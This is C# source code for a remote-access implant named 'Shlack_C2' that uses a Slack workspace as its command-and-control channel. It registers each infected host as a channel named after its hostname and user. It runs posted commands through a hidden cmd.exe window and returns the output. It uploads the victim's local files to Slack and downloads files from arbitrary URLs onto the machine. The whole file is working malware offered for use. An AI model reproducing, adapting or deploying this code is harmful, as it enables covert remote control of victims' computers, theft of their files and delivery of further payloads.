using System;
using System.Diagnostics;
using SlackAPI;
using System.Threading;

namespace Shlack_C2
{
    class Program
    {
        static void Main(string[] args)
        {
            string slack_token = "xoxb-TokenIsHERE"; //CHANGE THIS
            string oauth_token = "xoxp-TokenIsHERE"; //CHANGE THIS
        
            string targetID = ""; //This is to only accept messages sent through the created channel. Otherwise, any message received by the bot is to be executed.
            ManualResetEventSlim clientReady = new ManualResetEventSlim(false);
            SlackSocketClient client = new SlackSocketClient(slack_token);
            SlackSocketClient oauth_client = new SlackSocketClient(oauth_token);
            client.Connect((connected) => {
                // This is called once the client has emitted the RTM start command
                clientReady.Set();
            }, () => {
                // This is called once the RTM client has connected to the end point
            });
            client.OnMessageReceived += (message) =>
            {
                // Handle each message as you receive them
                if (message.bot_id == null && targetID == message.channel) //Only execute messages sent by users
                {
                    switch (message.text.ToLower().Split(' ')[0])
                    {
                        case "exit": //Terminate the shell
                            client.PostMessage(null, message.channel.ToString(), "Channel Terminated!");
                            Thread.Sleep(20);
                            Environment.Exit(1);
                            break;
                        case "upload": //Upload local files to Slack channel
                            string[] ch = new string[1];
                            ch[0] = message.channel.ToString();
                            try
                            {
                                string path = message.text.ToLower().Split(new[] { ' ' }, 2)[1];
                                client.UploadFile(null, System.IO.File.ReadAllBytes(path), System.IO.Path.GetFileName(path), ch);
                            }
                            catch (Exception e)
                            {
                                client.PostMessage(null, message.channel.ToString(), e.Message);
                            }
                            break;

                        case "download": //Download files to the victim .. download [URL] [NameOfFile/Path]
                            string @remoteUri = message.text.Split(new[] { ' ' }, 3)[1];
                            string @fileName = message.text.Split(new[] { ' ' }, 3)[2];
                            using (var down = new System.Net.WebClient())
                            {
                                try
                                {
                                    //remoteUri = System.Uri.EscapeDataString(remoteUri);
                                    remoteUri = remoteUri.Replace(">", "");
                                    remoteUri = remoteUri.Replace("<", "");
                                    down.DownloadFile(@remoteUri, @fileName);
                                }
                                catch (Exception e)
                                {
                                    client.PostMessage(null, message.channel.ToString(), e.Message.ToString());
                                }
                                break;
                            }

                        default:
                            string output = Execute(message.text);
                            client.PostMessage(null, message.channel.ToString(), output);
                            break;
                    }
                }
            };
            clientReady.Wait();

            string chan_name = (System.Net.Dns.GetHostName() + "_" + Environment.UserName).ToLower(); //Grab Hostname and Username for the channel name
            client.GetChannelList(null);
            var general = client.Channels.Find(x => x.name.Equals("general"));
            oauth_client.ChannelsCreate((response) => { //Create channel and assigne the targetID
                if (response.ok)
                {
                    client.PostMessage(null, general.id, "[+] Channel " + chan_name + " is created. Have fun :)");
                    targetID = response.channel.id.ToString();

                }
                else if (response.error == "name_taken")
                {
                    client.PostMessage(null, general.id, "[*] Channel " + chan_name + " is already exists.");
                    targetID = client.Channels.Find(x => x.name.Equals(chan_name)).id;
                }
                else
                {
                    client.PostMessage(null, general.id, "[-] Channel " + chan_name + " " + response.error.ToString());
                }

            }, chan_name);


            while (true) { Thread.Sleep(1000); }
        }

        public static string Execute(string cmd) //Excute command in cmd.exe
        {
            cmd = Contaminate(cmd);
            try
            {
                // Start the child process.
                Process p = new Process();
                // Redirect the output stream of the child process.
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.Arguments = "/c" + cmd;

                p.Start();
                // Do not wait for the child process to exit before
                // reading to the end of its redirected stream.
                // p.WaitForExit();
                // Read the output stream first and then wait.
                string output = p.StandardOutput.ReadToEnd();
                string error = p.StandardError.ReadToEnd();
                p.WaitForExit();

                return error + output;
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }

        public static string Contaminate(string original) //This just replaces sanitized chars
        {
            string edited = original;
            edited = edited.Replace("&gt;", ">");
            edited = edited.Replace("&lt;", "<");
            edited = edited.Replace("&amp;", "&");

            return edited;
        }
    }

}
